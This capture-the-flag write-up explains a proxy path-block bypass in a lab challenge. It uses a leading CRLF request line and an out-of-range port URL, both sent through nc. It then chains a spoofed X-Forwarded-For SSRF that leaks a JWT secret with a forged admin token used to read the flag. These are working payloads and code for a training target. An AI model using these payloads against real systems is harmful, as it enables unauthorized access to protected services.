## Overview

### Server1 (port 5000)

- Not exposed
- Serves JWT secret on `/.well-known/jwks.json`

### Server2 (port 3000)

- Not exposed
- The flag can be obtained by requesting `/admin/flag`, with the limitation of having a valid jwt token.
- SSRF on `/debug/fetch`

### Proxy (port 8082)

- Exposed
- Forwards requests to Server2 with the exclusion of paths starting with `/debug`

### Observation

In Server2, by requesting `/admin/flag` the server will only check if the JWT is generated with a valid secret and if role is admin.

And `/debug/fetch` will trust requests that has x-forwarded-for header equals to 127.0.0.1.

We can use SSRF to access Server1 and obtain JWT secret, then generate a valid JWT token and use it to access `/admin/flag`. Easy Right?

#### The missing piece

We can't access `/debug/fetch` because the proxy blocks it; We have to bypass that.

```js
if (checkPath.toLowerCase().startsWith("/debug")) {
  client.write(
    "HTTP/1.1 403 Forbidden\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 9\r\n\r\nforbidden"
  );
  client.end();
  upstream.end();
  return;
}
```

#### Bypassing proxy path blocking

One thing that you may noticed is headers are parsed manually using `parseHeaders`:

```js
  client.on("data", (chunk) => {
    clientBuf = Buffer.concat([clientBuf, chunk]);

    const meta = parseHeaders(clientBuf);
    if (!meta) return;

    const { idx, method, path, headers } = meta;
```

Another thing that feels wrong is ignoring the error of URL parsing:

```js
try {
  if (/^https?:\/\//i.test(checkPath)) {
    const u = new URL(checkPath);
    checkPath = u.pathname || "";
  }
} catch (_) {}
```

### Payloads:

note:replace `instanceip` with yours

```bash
printf '\r\nGET /debug/fetch?url=http://localhost:5000/.well-known/jwks.json HTTP/1.1\r\nHost: example\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n' | nc instanceip 8082
```

- parseHeaders will split with \r\n and parse the first part as the request line which will result in empty string, hence `/^https?:\/\//i.test(checkPath)` is false

```bash
 printf 'GET https://localhost:65536/debug/fetch?url=http://localhost:5000/.well-known/jwks.json HTTP/1.1\r\nHost: example\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n' | nc instanceip 8082

```

- `new URL(checkPath)` will throw an error since 65536 is bigger than the maximum allowed port 65535

### Flag (no idea)

the previous payload will let us obtain the JWT secret (the field 'n' from the JSON response).

```json
{
  "keys": [
    {
      "kty": "RSA",
      "n": "random-string-for-hmac-secret",
      ...
    }
  ]
}
```

generate a valid jwt token:

```js
const jwt = require("jsonwebtoken");

const secret = "random-string-for-hmac-secret";
const payload = { role: "admin" };
const token = jwt.sign(payload, secret, { algorithm: "HS256" });

console.log(token);
```

get the flag

```bash

curl -v \
  -H "Authorization: Bearer eyJxxxxxxxx" \
  http://instanceip:8082/admin/flag
```
